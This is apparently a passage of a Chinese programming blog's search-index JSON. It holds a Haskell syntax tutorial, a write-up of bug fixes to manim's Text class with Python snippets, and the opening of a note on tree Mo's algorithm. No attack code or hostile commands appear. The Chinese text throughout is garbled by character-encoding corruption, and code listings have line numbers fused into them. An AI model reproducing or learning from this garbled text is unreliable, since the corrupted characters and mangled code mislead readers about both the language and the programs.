p;&thinsp;","link":"/p/53e482b7.html"},{"title":"ã€ŒLearn Haskellã€#1 åŸºç¡€è¯­æ³•ä¸å‡½æ•°","text":"&lt; #0 #2 &gt; åŸºç¡€è¿ç®— + - * / ()ï¼šåŠ å‡ä¹˜é™¤ divï¼šæ•´é™¤ modï¼šå–æ¨¡ True Falseï¼šå¸ƒå°”å€¼ || &amp;&amp; notï¼šæˆ–ä¸”é ==ï¼šæ¡ä»¶åˆ¤æ–­ï¼Œç›¸ç­‰ /=ï¼šæ¡ä»¶åˆ¤æ–­ï¼Œä¸ç­‰ å‡½æ•°è°ƒç”¨Haskellä¸­è°ƒç”¨å‡½æ•°ä¸åŠ æ‹¬å·ï¼Œå…ˆå†™å‡ºå‡½æ•°åï¼Œç„¶åé€ä¸ªåˆ—å‡ºå‚æ•°ï¼Œç”¨ç©ºæ ¼éš”å¼€ï¼š 12ghci&gt; max 1 22 å‰ç¼€ï¼ˆprefixï¼‰å‡½æ•°ä¸ä¸­ç¼€ï¼ˆinfixï¼‰å‡½æ•°è½¬æ¢ï¼š å¯¹å‰ç¼€å‡½æ•°åŠ ``ä½¿å…¶å˜æˆä¸­ç¼€å‡½æ•° å¯¹ä¸­ç¼€å‡½æ•°åŠ ()ä½¿å…¶å˜æˆå‰ç¼€å‡½æ•° 12345678ghci&gt; 4 `div` 22ghci&gt; 1 `max` 22ghci&gt; (+) 1 23ghci&gt; (||) True FalseTrue Liståˆ—è¡¨æ˜¯Haskellä¸­å¾ˆå¸¸è§çš„æ•°æ®ç±»å‹ï¼Œå’ŒPythonä¸­ä¸åŒï¼ŒHaskellä¸­çš„åˆ—è¡¨ä¸­çš„æ‰€æœ‰å…ƒç´ å¿…é¡»æ˜¯åŒä¸€ä¸ªç±»å‹ã€‚ ä»¥ä¸‹æ˜¯åˆ—è¡¨å¸¸ç”¨çš„å‡½æ•°ï¼š (++) :: [a] -&gt; [a] -&gt; [a]ï¼šåˆå¹¶ä¸¤ä¸ªåˆ—è¡¨ (:) :: a -&gt; [a] -&gt; [a]ï¼šå°†å•ä¸ªå…ƒç´ å¹¶å…¥åˆ—è¡¨ã€‚[1, 2, 3]æ˜¯1:2:3:[]çš„è¯­æ³•ç³– (!!) :: [a] -&gt; Int -&gt; aï¼šé€šè¿‡ç´¢å¼•å–å‡ºæŸä¸ªä½ç½®ä¸Šçš„å…ƒç´ ã€‚a !! 1ç›¸å½“äºPythonä¸­çš„a[1] head :: [a] -&gt; aï¼šè¿”å›åˆ—è¡¨çš„ç¬¬ä¸€ä¸ªå…ƒç´  tail :: [a] -&gt; [a]ï¼šè¿”å›åˆ—è¡¨ä¸­é™¤å»ç¬¬ä¸€ä¸ªå…ƒç´ åçš„åˆ—è¡¨ï¼ˆè‹¥åªæœ‰ä¸€ä¸ªå…ƒç´ åˆ™è¿”å›ç©ºåˆ—è¡¨[]ï¼‰ last :: [a] -&gt; aï¼šè¿”å›åˆ—è¡¨ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´  init :: [a] -&gt; [a]ï¼šè¿”å›åˆ—è¡¨ä¸­é™¤å»æœ€åä¸€ä¸ªå…ƒç´ åçš„åˆ—è¡¨ length :: Foldable t =&gt; t a -&gt; Intï¼šè¿”å›åˆ—è¡¨çš„é•¿åº¦ null :: Foldable t =&gt; t a -&gt; Boolï¼šè¿”å›åˆ—è¡¨æ˜¯å¦ä¸ºç©º reverse :: [a] -&gt; [a]ï¼šè¿”å›ç¿»è½¬åçš„åˆ—è¡¨ take :: Int -&gt; [a] -&gt; [a]ï¼šè¿”å›åˆ—è¡¨açš„å‰nä¸ªå…ƒç´ çš„åˆ—è¡¨(take n a) drop :: Int -&gt; [a] -&gt; [a]ï¼šè¿”å›åˆ—è¡¨aä¸­é™¤å»å‰nä¸ªå…ƒç´ åçš„åˆ—è¡¨(drop n a) maximum :: (Foldable t, Ord a) =&gt; t a -&gt; aï¼šè¿”å›åˆ—è¡¨ä¸­çš„æœ€å¤§å€¼ minimum :: (Foldable t, Ord a) =&gt; t a -&gt; aï¼šè¿”å›åˆ—è¡¨ä¸­çš„æœ€å°å€¼ sum :: (Foldable t, Num a) =&gt; t a -&gt; aï¼šè¿”å›åˆ—è¡¨ä¸­æ‰€æœ‰å…ƒç´ çš„å’Œ product :: (Foldable t, Num a) =&gt; t a -&gt; aï¼šè¿”å›åˆ—è¡¨ä¸­æ‰€æœ‰å…ƒç´ çš„ç§¯ elem :: (Foldable t, Eq a) =&gt; t a -&gt; Boolï¼šåˆ¤æ–­å€¼næ˜¯å¦åœ¨åˆ—è¡¨aä¸­( 123elem n a-- æˆ–n `elem` a --ç”¨``åŒ…ä¸Šå¯ä»¥å˜æˆä¸­ç¼€å‡½æ•°ä½¿ç”¨ Texas rangesä½¿ç”¨..å¯ä»¥è¡¨ç¤ºå‡ºèŒƒå›´å¹¶è‡ªåŠ¨æ¨å¯¼ï¼š 123456789101112ghci&gt; [1 .. 10] [1,2,3,4,5,6,7,8,9,10] ghci&gt; ['a' .. 'z'] &quot;abcdefghijklmnopqrstuvwxyz&quot; ghci&gt; ['K' .. 'Z'] &quot;KLMNOPQRSTUVWXYZ&quot; ghci&gt; [2, 4 .. 20] [2,4,6,8,10,12,14,16,18,20] ghci&gt; [3, 6 .. 20] [3,6,9,12,15,18]ghci&gt; [5, 4 .. 1][5,4,3,2,1] ä¹Ÿå¯ä»¥ç”¨æ¥ç”Ÿæˆæ— ç©·åˆ—è¡¨ï¼Œå¦‚[1..]ã€[1, 3..]ã€‚åŒæ—¶ä¹Ÿæœ‰å‡½æ•°å¯ä»¥ç”Ÿæˆæ— ç©·åˆ—è¡¨ï¼š cycle :: [a] -&gt; [a]ï¼šå°†åŸåˆ—è¡¨ä¸æ–­å¾ªç¯ç”Ÿæˆæ— ç©·åˆ—è¡¨ repeat :: a -&gt; [a]ï¼šå°†ä¼ å…¥çš„å€¼ä¸æ–­é‡å¤ç”Ÿæˆæ— ç©·åˆ—è¡¨ replicate :: Int -&gt; a -&gt; [a]ï¼šå°†å€¼aé‡å¤næ¬¡ï¼Œè¿”å›ç”Ÿæˆçš„åˆ—è¡¨(replicate n a) List comprehensionHaskellä¸­ä¹Ÿæœ‰åˆ—è¡¨æ¨å¯¼ï¼Œå½¢å¼æ˜¯ä¸€ä¸ªä¸­æ‹¬å·ï¼Œå·¦ä¾§ä¸ºè¡¨è¾¾å¼ï¼Œå³ä¾§ä¸ºå˜é‡çš„èŒƒå›´å’Œçº¦æŸæ¡ä»¶ 12345678ghci&gt; [x * 2 | x &lt;- [1 .. 10]] [2,4,6,8,10,12,14,16,18,20] ghci&gt; [x * 2 | x &lt;- [1 .. 10], x * 2 &gt;= 12] [12,14,16,18,20]ghci&gt; [ x | x &lt;- [50 .. 100], x `mod` 7 == 3] [52,59,66,73,80,87,94] ghci&gt; [x * y | x &lt;- [2, 5, 10], y &lt;- [8, 10, 11]] [16,20,22,40,50,55,80,100,110] TupleHaskellä¸­çš„å…ƒç»„å¯ä»¥æœ‰ä¸åŒé•¿åº¦ï¼Œå…ƒç´ å¯ä»¥æœ‰ä¸åŒç±»å‹ã€‚å¹¶ä¸”ä¸€ä¸ªå…ƒç»„çš„ç±»å‹ç”±å…¶ä¸­æ‰€æœ‰å…ƒç´ çš„ç±»å‹å…±åŒå†³å®šã€‚å®ƒçš„å¸¸ç”¨å‡½æ•°ï¼š fst :: (a, b) -&gt; aï¼šè¿”å›å«æœ‰ä¸¤ä¸ªå…ƒç´ å…ƒç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´  snd :: (a, b) -&gt; bï¼šè¿”å›å«æœ‰ä¸¤ä¸ªå…ƒç´ å…ƒç»„ä¸­çš„ç¬¬äºŒä¸ªå…ƒç´  zip :: [a] -&gt; [b] -&gt; [(a, b)]ï¼šæ¥æ”¶ä¸¤ä¸ªåˆ—è¡¨ï¼Œè¿”å›ä¸€ä¸ªåˆ—è¡¨ï¼Œæ¯ä¸ªå…ƒç´ æ˜¯ä¾æ¬¡å°†ä¸¤ä¸ªåˆ—è¡¨ä¸­å…ƒç´ é…å¯¹æˆçš„äºŒå…ƒç»„ Syntax in Functionså‡½æ•°å¯ä»¥ç›´æ¥å®šä¹‰ï¼š 1plus x y = x + y è¿™æ—¶Haskellä¼šè‡ªåŠ¨æ¨æ–­å‡½æ•°çš„ç±»å‹ä¸º(Num a) =&gt; a -&gt; a -&gt; aã€‚ä½†æ˜¯æœ€å¥½åœ¨å®šä¹‰å‡½æ•°å‰å£°æ˜å‡½æ•°çš„ç±»å‹ï¼š 12plus :: (Num a) =&gt; a -&gt; a -&gt; aplus x y = x + y Pattern matchingå®šä¹‰å‡½æ•°æ—¶å¯ä»¥ä½¿ç”¨æ¨¡å¼åŒ¹é…è¯­æ³•ã€‚è¿è¡Œæ—¶ä¾æ¬¡å°†è¾“å…¥ä¸ç»™å‡ºçš„æ¨¡å¼ç›¸åŒ¹é…ï¼Œå¦‚æœåŒ¹é…ï¼Œå°±æ‰§è¡Œå¯¹åº”æ“ä½œï¼›ä¸åŒ¹é…ï¼Œå°±ç»§ç»­ä¸ä¸‹ä¸€ä¸ªæ¨¡å¼ç›¸åŒ¹é…ï¼Œç›´åˆ°åŒ¹é…æˆåŠŸï¼Œä¹Ÿå› æ­¤ï¼Œæœ€åå¿…é¡»è¦ç»™å‡ºä¸€ç§é€šç”¨çš„åŒ¹é…æ¥æ¥æ”¶ä¸ç»™å‡ºæ¨¡å¼å…¨ä¸åŒ¹é…çš„è¾“å…¥ã€‚å¦‚ï¼š 123factorial :: (Integral a) =&gt; a -&gt; a factorial 0 = 1 factorial n = n * factorial (n - 1) 12345678first :: (a, b, c) -&gt; a first (x, _, _) = x second :: (a, b, c) -&gt; b second (_, y, _) = y third :: (a, b, c) -&gt; c third (_, _, z) = z å…¶ä¸­_è¡¨ç¤ºä»»ä½•å€¼ï¼Œä¸”ä¸å…³å¿ƒå®ƒçš„å†…å®¹ï¼Œåªæ˜¯ç”¨æ¥å ä½ åˆ—è¡¨çš„(:)æ“ä½œä¹Ÿå¯ä»¥ç”¨æ¥è¿›è¡Œæ¨¡å¼åŒ¹é…ï¼š 1234567head' :: [a] -&gt; a head' [] = error &quot;Can't call head on an empty list, dummy!&quot; head' (x:_) = xsum' :: (Num a) =&gt; [a] -&gt; a sum' [] = 0 sum' (x:xs) = x + sum' xs ä½†(++)æ“ä½œä¸å¯ä»¥ç”¨æ¥æ¨¡å¼åŒ¹é… åœ¨é’ˆå¯¹åˆ—è¡¨è¿›è¡Œæ¨¡å¼åŒ¹é…æ—¶ï¼Œå¦‚æœåŒæ—¶éœ€è¦æ•´ä¸ªåˆ—è¡¨ã€åˆ—è¡¨çš„ç¬¬ä¸€ä¸ªå€¼ã€åˆ—è¡¨é™¤ç¬¬ä¸€ä¸ªå€¼å¤–çš„å†…å®¹ï¼Œå¯ä»¥ä½¿ç”¨xs@(q:qs)ã€‚æ¯”å¦‚[1, 2, 3]é€šè¿‡xs@(q:qs)åŒ¹é…åï¼Œxsä¸º[1, 2, 3]ï¼Œqä¸º1ï¼Œqsä¸º[2, 3] Guard syntaxåœ¨å‡½æ•°çš„å®šä¹‰ä¸­ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å®ˆå«ï¼ˆguardï¼‰è¯­æ³•ï¼š 1234max' :: (Ord a) =&gt; a -&gt; a -&gt; a max' a b | a &gt; b = a | otherwise = b å…ˆç»™å‡ºä¼ å…¥çš„å‚æ•°å˜é‡ï¼Œç„¶åä¸‹ä¸€è¡Œç¼©è¿›ååŠ |ï¼Œ|åé¢ç­‰å·å‰è¡¨ç¤ºè¿›è¡Œçš„åˆ¤æ–­ï¼Œå¦‚æœä¸ºTrueåˆ™è¿”å›è¿™ä¸ªç­‰å·åé¢çš„å€¼ï¼›å¦‚æœä¸ºFalseåˆ™ç»§ç»­åˆ¤æ–­ä¸‹ä¸€è¡Œï¼Œç›´åˆ°otherwise Case expressionsåœ¨å‡½æ•°çš„å®šä¹‰ä¸­ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨caseè¡¨è¾¾å¼æ¥é…åˆæ¨¡å¼åŒ¹é…ä½¿ç”¨ï¼š 123case expression of pattern -&gt; result pattern -&gt; result ... ä¾‹å¦‚ï¼š 1234567head' :: [a] -&gt; a head' [] = error &quot;No head for empty lists!&quot; head' (x:_) = x -- ç­‰ä»·äºï¼šhead' :: [a] -&gt; a head' xs = case xs of [] -&gt; error &quot;No head for empty lists!&quot; (x:_) -&gt; x 12345678910describeList :: [a] -&gt; String describeList xs = &quot;The list is &quot; ++ case xs of [] -&gt; &quot;empty.&quot; [x] -&gt; &quot;a singleton list.&quot; xs -&gt; &quot;a longer list.&quot; -- ç­‰ä»·äºï¼šdescribeList :: [a] -&gt; String describeList xs = &quot;The list is &quot; ++ what xs where what [] = &quot;empty.&quot; what [x] = &quot;a singleton list.&quot; what xs = &quot;a longer list.&quot; whereå£°æ˜åœ¨å‡½æ•°å®šä¹‰ä¸­è¦ä½¿ç”¨çš„å±€éƒ¨å˜é‡ï¼Œå¯ä»¥ä½¿ç”¨whereå…³é”®å­—ï¼š 1234initials :: String -&gt; String -&gt; String initials firstname lastname = [f] ++ &quot;. &quot; ++ [l] ++ &quot;.&quot; where (f:_) = firstname (l:_) = lastname åœ¨whereä¸­ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ä¸Šé¢çš„æ¨¡å¼åŒ¹é… letlet &lt;bindings&gt; in &lt;expression&gt;è¯­æ³•å¯ä»¥åœ¨å‡½æ•°çš„å®šä¹‰ä¸­ä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥åœ¨æ™®é€šç®—å¼æˆ–åˆ—è¡¨ä¸­ä½¿ç”¨ï¼š 12345cylinder :: (RealFloat a) =&gt; a -&gt; a -&gt; a cylinder r h = let sideArea = 2 * pi * r * h topArea = pi * r ^2 in sideArea + 2 * topArea 1234ghci&gt; 4 * (let a = 9 in a + 1) + 2 42 ghci&gt; [let square x = x * x in (square 5, square 3, square 2)] [(25,9,4)] if statementHaskellä¸­çš„ifè¯­å¥ä¸ºï¼š 1234567if ... then ...else ...-- or if ... then ... else ...-- orif ... then ...else if ... then ...else ... å…¶ä¸­æœ€åä¸€ä¸ªelseæ— è®ºå¦‚ä½•ä¹Ÿä¸å¯ä»¥çœå» Reference Learn You a Haskell ç›®å½• #0&nbsp;|&nbsp;æ€»ç« &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;#1&nbsp;|&nbsp;åŸºç¡€è¯­æ³•ä¸å‡½æ•°&emsp;&emsp;&emsp;#2&nbsp;|&nbsp;é«˜é˜¶å‡½æ•°ä¸æ¨¡å—&emsp;&emsp;&emsp;#3&nbsp;|&nbsp;ç±»å‹ä¸ç±»å‹ç±»&emsp;&emsp;&emsp;&emsp;#4&nbsp;|&nbsp;è¾“å…¥è¾“å‡ºä¸æ–‡ä»¶&emsp;&emsp;&emsp;#5&nbsp;|&nbsp;å‡½å­ã€åº”ç”¨å‡½å­ä¸å•å­#6&nbsp;|&nbsp;åŠç¾¤ä¸å¹ºåŠç¾¤&emsp;&emsp;&emsp;&emsp;#7&nbsp;|&nbsp;ä¸€äº›å…¶å®ƒç±»å‹ç±»&emsp;&emsp;&emsp;#A&nbsp;|&nbsp;Haskellä¸èŒƒç•´è®º&emsp;&nbsp;&thinsp;","link":"/p/d63b5b5f.html"},{"title":"ä¿®å¤manimä¸­Textç±»çš„bug","text":"åœ¨ä½¿ç”¨manimæ—¶,å¯¹äºTextç±»,ä¼šæœ‰ä¸€äº›bug,æˆ‘å°è¯•ä¿®å¤äº†å®ƒä»¬ åœ¨shadersåˆ†æ”¯ä¸‹æ— æ³•ä½¿ç”¨Textç±» Textæ–‡å­—çš„strokeè¾¹æ¡†ä¸å®Œæ•´,å¯¼è‡´æ˜¾ç¤ºstrokeä¼šéå¸¸éš¾çœ‹ å«æœ‰ç©ºæ ¼çš„Textçš„ç©ºæ ¼ä¸åœ¨æ–‡å­—å†…éƒ¨,è€Œåœ¨ORIGINçš„ä½ç½®,å¯¼è‡´Transformæ—¶ä¼šæœ‰å­—ç¬¦åœ¨åŸä½ç½®å’ŒORIGINä¹‹é—´ åå¤æ¨ªè·³ Textæ–‡å­—çš„é»˜è®¤å¤§å°è¦æ¯”TextMobjectå¤§,ä¸å®¹æ˜“åƒTextMobjectä¸€æ ·æ§åˆ¶å¤§å° è¿™äº›é—®é¢˜å·²ç»é€šè¿‡#1030ä¿®å¤åˆ°äº†manimçš„masteråˆ†æ”¯ä¸­ $\\mathcal{Bug\\ 1.}$å½“åœ¨shadersåˆ†æ”¯ä¸‹ä½¿ç”¨Textç±»æ—¶ä¼šå‡ºç°å¦‚ä¸‹æŠ¥é”™:å…¶ä¸­æœ€åä¸€è¡Œè®©æˆ‘å‘ç°æ­¤æ—¶çš„p0å’Œp1çš„å¤§å°ä¸ç›¸ç­‰,ä¸èƒ½ç›¸åŠ (broadcast),è€Œp0å’Œp1æ˜¯é€šè¿‡è´èµ›å°”æ›²çº¿çš„æ¬¡æ•°(åœ¨shadersä¸‹æ˜¯3)æ¥æ‹†åˆ†self.pointsçš„æ‰€ä»¥å¯èƒ½æ˜¯self.pointsçš„é•¿åº¦ä¸ä¸º3çš„å€æ•°,å¯¼è‡´äº†é”™è¯¯.åœ¨print(len(self.points))åå‘ç°ç¡®å®æ˜¯è¿™æ ·ç„¶åæˆ‘åˆç”¨äº† ç„å­¦ æ‰‹æ®µ,åˆ æ‰äº†SVGMobjectçš„æœ€åä¸€ä¸ªç‚¹,å‘ç°å¯ä»¥æ­£å¸¸æ¸²æŸ“ æ­¤æ—¶æˆ‘åˆå»çœ‹äº†cairoè‡ªåŠ¨ç”Ÿæˆçš„svgä»£ç ,æ ¹æ®æˆ‘ä¹‹å‰å­¦svgçš„ä¸€ç‚¹ç»éªŒ,å‘ç°æ¯ä¸ª&lt;path/&gt;çš„è·¯å¾„ç»“å°¾éƒ½ä¸ºZ M ... ... /&quot;&gt;è€ŒZæ˜¯å°†è·¯å¾„é—­åˆ,ä½†é—­åˆååˆå¤šå‡ºäº†ä¸€ä¸ªMæ§åˆ¶ç¬¦,è¿™ä¼šå¯¼è‡´manimåœ¨å¤„ç†svgæ—¶é¢å¤–ç”Ÿæˆä¸€ä¸ªç‚¹è€Œåˆ æ‰æ¯ä¸ªè·¯å¾„å­—ç¬¦ä¸²çš„æœ€åä¸€ä¸ªMæ§åˆ¶ç¬¦,å¯ä»¥ç›´æ¥ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…å‡ºæ¥,ç„¶åæ›¿æ¢æ‰ æˆ‘ç¬¬ä¸€ä¸ªæƒ³åˆ°çš„æ­£åˆ™è¡¨è¾¾å¼æ˜¯Z M .*? /&quot;&gt;,ä½†æ˜¯å¦‚æœåœ¨è·¯å¾„çš„ä¸­é—´å‡ºç°Z M,åˆ™ä¼šå°†å…¶åé¢æœ‰ç”¨çš„éƒ¨åˆ†ä¸€èµ·åˆ é™¤è€Œæœ‰ç”¨çš„éƒ¨åˆ†ä¸€å®šå«æœ‰æ§åˆ¶ç¬¦,æ‰€ä»¥å°†æ§åˆ¶ç¬¦æ’é™¤,å°±å¯ä»¥ä»…ä»…åŒ¹é…æ‰æœ€åä¸€ä¸ªM,æ­£åˆ™è¡¨è¾¾å¼:Z M [^A-Za-z]*? /&quot;&gt; 123456def remove_last_M(self, file_name): with open(file_name, 'r') as fpr: content = fpr.read() content = re.sub(r'Z M [^[A-Za-z]*? &quot;\\/&gt;', 'Z &quot;/&gt;', content) with open(file_name, 'w') as fpw: fpw.write(content) $\\mathcal{Bug\\ 2.}$Textæ–‡å­—çš„strokeè¾¹æ¡†ä¸å®Œæ•´,å¯¼è‡´strokeæ˜¾ç¤ºä¸å…¨,ä¹Ÿä¼šå¯¹DrawBorderThenFillé€ æˆå½±å“,ä¹Ÿæœ‰Bç«™çš„è§‚ä¼—å‘æˆ‘æäº†è¿™ä¸ªé—®é¢˜ â€“ è¯è¯´ï¼Œæ„Ÿè§‰æ¯ä¸ªChapterä¹‹é—´çš„æ–‡å­—æ˜¯ä¸æ˜¯å…ˆç”»å‡ºè½®å»“å†å¡«å……ä¸Šè‰²ï¼Œç”»å®Œè½®å»“çš„æ—¶å€™åœé¡¿äº†ä¸€ä¸‹ã€‚ä½†æ˜¯åœé¡¿çš„æ—¶å€™è½®å»“æ²¡æœ‰ç”»å®Œï¼Œæœ‰äº›åœ°æ–¹æœ‰ç‚¹æ–­ç»­çš„æ„Ÿè§‰â€“ Textç±»çš„bugï¼Œstrokeæ—¥å¸¸ä¹±å¥— ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜,æˆ‘åªæ˜¾ç¤ºäº†stroke,å¹¶ä¸”ç”¨debugTeXæ ‡å‡ºäº†æ„æˆæ¯ä¸ªå­—ç¬¦çš„self.pointsçš„ä½ç½®,æ¯”å¦‚â€manimâ€å¦‚ä¸‹:é€šè¿‡è§‚å¯Ÿå’Œä¸@XiaoYoungäº¤æµä¹‹å,ç¡®å®šäº†cairoç”Ÿæˆçš„svgå¹¶ä¸èƒ½ä½¿è·¯å¾„è‡ªåŠ¨é—­åˆè€Œåœ¨ä¸€èˆ¬æŸ¥çœ‹svgçš„è½¯ä»¶(Chrome)ä¸­,svgå›¾åƒåªæ˜¾ç¤ºå†…éƒ¨(fill),è€Œstrokeè¢«å¿½ç•¥(å¾ˆç»†),æ‰€ä»¥æ­£å¸¸ä½¿ç”¨æ²¡é—®é¢˜ä½†æ˜¯åœ¨manimä¸­æœ‰æ—¶éœ€è¦ä½¿ç”¨stroke,è¿™æ—¶cairoç”Ÿæˆçš„svgå‡ºç°äº†bug,è·¯å¾„æ²¡æœ‰å®Œå…¨é—­åˆ æˆ‘æœ€å¼€å§‹çš„æƒ³æ³•æ˜¯ç›´æ¥é€šè¿‡.add_line_to()æ–¹æ³•å°†svgæ”¶å°¾ç›¸è¿,ä½†æ˜¯è¿™æ˜¾ç„¶åªè§£å†³äº†må’Œnè€Œaå’Œiæ˜¯ç”±ä¸¤æ¡è·¯å¾„å¤åˆè€Œæˆçš„,å…¶ä¸­çš„æ¯æ¡è·¯å¾„éƒ½æ²¡æœ‰é—­åˆ,æ‰€ä»¥éƒ½éœ€è¦æ‰‹åŠ¨é—­åˆ,æ‰€ä»¥æˆ‘å†³å®šéå†self.pointsè¿™æ—¶æˆ‘ä½¿ç”¨äº†ä¸€ä¸ªlastå˜é‡æ¥è®°å½•éå†åˆ°å½“å‰ä½ç½®æ‰€åœ¨çš„è·¯å¾„ä¸Šçš„èµ·ç‚¹,å¹¶ä¸”å¦‚æœåˆ°äº†ä¸‹ä¸€æ¡è·¯å¾„(ç´¢å¼•ä¸ºnppcçš„å€æ•°,å¹¶ä¸”ä¸ä¸å‰ä¸€ä¸ªç‚¹ç›¸é‡åˆ),å°±å°†é¦–å°¾è¿æ¥ä¸Š,å¹¶æ›´æ–°last è€Œè¿™æ ·åšè¿˜éœ€è¦ä¸€ä¸ªç‰¹åˆ¤,å½“pointsä¸ºç©ºæ—¶(ç©ºæ ¼)ç›´æ¥è·³è¿‡,å¦åˆ™points[0]ä¼šæŠ¥é”™ 12345678910111213nppc = self.n_points_per_cubic_curvefor each in self: if len(each.points) == 0: continue points = each.points last = points[0] each.clear_points() for index, point in enumerate(points): each.append_points([point]) if index != len(points) - 1 and (index + 1) % nppc == 0 and any(point != points[index+1]): each.add_line_to(last) last = points[index + 1] each.add_line_to(last) è¿™æ ·åšä¹‹å,è¿™ä¸ªbugå°±å®Œå…¨è§£å†³äº†,è€Œä¸”ä¸­æ–‡ä¹ŸåŒæ—¶é€‚ç”¨,å¯¹æ¯”å¦‚ä¸‹,ä¸Šä¸ºä¿®å¤ä¹‹å‰,ä¸‹ä¸ºä¿®å¤ä¹‹å(éƒ½ä¸ºä»…æ˜¾ç¤ºstroke) $\\mathcal{Bug\\ 3.}$è¿™ä¸ªæ˜¯éå¸¸å¸¸è§çš„é—®é¢˜äº†,å¦‚ä¸‹:ä¹‹å‰è§£å†³è¿™ä¸ªé—®é¢˜æ˜¯é€šè¿‡â€™å‡ç©ºæ ¼â€™,å³ç”¨ä¸€ä¸ªä¸å¸¸ç”¨å­—ç¬¦è¡¨ç¤ºç©ºæ ¼,å¹¶å°†å…¶è®¾ä¸ºèƒŒæ™¯è‰²,æˆ–è€…opacityæ”¹æˆ0é€šè¿‡debugTeXå¯ä»¥å‘ç°,Textçš„ç©ºæ ¼å å­—ç¬¦è€Œä¸”ä½ç½®åœ¨ORIGINè€ŒTextMobjectä¸­çš„ç©ºæ ¼ç›´æ¥ä¸å ä½ç½®.æ‰€ä»¥æˆ‘ç›´æ¥åœ¨å¤„ç†bug2çš„åŒæ—¶,å°†len(each.points) == 0çš„å¤„ç†ä¸­åŠ ä¸Šäº†self.remove(each),è¿™æ ·å°±æš‚æ—¶è§£å†³äº†è€Œ@XiaoYoungä¹Ÿæé†’äº†æˆ‘,è¿™æ ·çš„å¤„ç†ä¼šå¹²æ‰°t2cçš„è‡ªåŠ¨ä¸Šè‰²(ä¸‹æ ‡æ”¹å˜äº†),åœ¨#1018è¿™é‡Œ,ä»–å†³å®šå•å¼€ä¸€ä¸ªpræ¥ä¿®å¤è¿™ä¸ªbug,æ‰€ä»¥æˆ‘å°±æŠŠè¿™ä¸€ä¸ªcommitåˆ é™¤æ‰äº† $\\mathcal{Bug\\ 4.}$Textæ–‡å­—çš„é»˜è®¤å¤§å°è¦æ¯”TextMobjectå¤§,ä¸å®¹æ˜“åƒTextMobjectä¸€æ ·æ§åˆ¶å¤§å°é€šè¿‡é˜…è¯»æºç å¯ä»¥å‘ç°,TextMobjectåœ¨__init__()çš„ç»“å°¾,æœ‰ä¸€å¥ 12if self.height is None: self.scale(TEX_MOB_SCALE_FACTOR) è€Œè¿™ä¸ªTEX_MOB_SCALE_FACTORé»˜è®¤ä¸º0.05,å³å°†é»˜è®¤çš„SVGMobject(é«˜åº¦ä¸ºå›ºå®šé»˜è®¤å€¼)ç¼©å°ä¸º0.05å€è€ŒTextç±»æœ€åç¼©å°äº†0.1å€,å¯¼è‡´äº†å¤§å°ä¸ç­‰,å°†å…¶æ”¹ä¸º0.05å,å°±æ–¹ä¾¿ç»Ÿä¸€å¤§å°äº† $\\mathcal{Pull\\ Requests}$ç¬¬ä¸€æ¬¡æäº¤pr,è®°å½•ä¸€ä¸‹ å°†åŸrepo forkåˆ°è‡ªå·±çš„ç”¨æˆ·ä¸Š cloneä¸‹æ¥forkçš„repo è¿›è¡Œæ›´æ”¹,add/commit/push,commitçš„æ³¨é‡Šè¦è§„èŒƒ åœ¨GitHubç½‘é¡µä¸Š,æ‰“å¼€forkçš„repo,ä¼šæœ‰ä¸€ä¸ªæŒ‰é’®New Pull Request æ¯”è¾ƒ,ç¡®è®¤æ›´æ”¹,ç„¶åCreate Pull Request,è¡¨è¿°å‡ºprçš„å¿…è¦æ€§å’ŒéªŒè¯,æäº¤pr ç­‰å¾…repoç®¡ç†å‘˜merge è¿™æ¬¡ä¿®å¤bugçš„pråœ¨#1030å’Œ#1031å…¶ä¸­#1030è¢«mergeäº†,è€Œ#1031è¿˜åœ¨ç­‰å¾…","link":"/p/b6815e8.html"},{"title":"æ ‘ä¸Šè«é˜Ÿ-ç¬”è®°  &#x2F;ã€ŒSPOJ 10707ã€COT2-é¢˜è§£","text":"é€šè¿‡SPOJ 10707 COT2-Count on a tree IIè¿™é“é¢˜ç›®æ¥å­¦ä¹ ä¸€ä¸‹ æ ‘ä¸Šè«é˜Ÿå½“éœ€è¦ç¦»çº¿æŸ¥è¯¢ æ ‘ä¸Š çš„å¤šåŒºé—´é—®é¢˜æ—¶,å¯ä»¥ä½¿ç”¨ æ ‘ä¸Šè«é˜Ÿ æ¥è§£å†³ ä¸»è¦é€šè¿‡ æ¬§æ‹‰åº å°†æ ‘è½¬åŒ–ä¸ºä¸€æ¡é“¾,ç„¶ååœ¨é“¾ä¸Šæ‰§è¡Œæ™®é€šè«é˜Ÿçš„æ“ä½œ æ ‘ä¸Šè«é˜Ÿæ¬§æ‹‰åºæ­£å¸¸è¿›è¡Œdfs,åœ¨å…¥å’Œå‡ºæ—¶å„åŠ å…¥åºåˆ—ä¸­æ¯”å¦‚æ ·ä¾‹çš„æ ‘å¦‚ä¸‹:å…¶æ¬§æ‹‰åºä¸º1 2 2 3 5 5 6 6 7 7 3 4 8 8 4 1å¯ä»¥å¾ˆå¥½åœ°å‘ˆç°å‡ºå­æ ‘çš„å…³ç³»,å³ä¸¤ä¸ªç›¸åŒçš„æ•°$x$ä¹‹é—´çš„éƒ¨åˆ†ä¸º$x$å­æ ‘ä¸­çš„èŠ‚ç‚¹å…¶æœ‰ä¸€ä¸ªæ€§è´¨:åŒºé—´å†…å‡ºç°ä¸¤æ¬¡çš„ç‚¹ä¸åœ¨å…¶è·¯å¾„ä¸Šæ ¹æ®è¿™ä¸ªæ€§è´¨,å¯ä»¥å°†æ ‘è½¬åŒ–ä¸ºé“¾æ¥æ±‚è§£äº† æ€æƒ³é™¤äº†å°†æ ‘è½¬åŒ–ä¸ºæ¬§æ‹‰åºä¹‹å¤–,è¿˜éœ€è¦æ±‚å‡ºå·¦å³ç«¯ç‚¹çš„$LCA$,ä»¥åŠä¸€ä¸ªç‚¹$\\texttt{u}$åœ¨æ¬§æ‹‰åºä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®$\\texttt{fst[u]}$,ç¬¬äºŒæ¬¡(æœ€åä¸€æ¬¡)å‡ºç°çš„ä½ç½®$\\texttt{lst[u]}$ 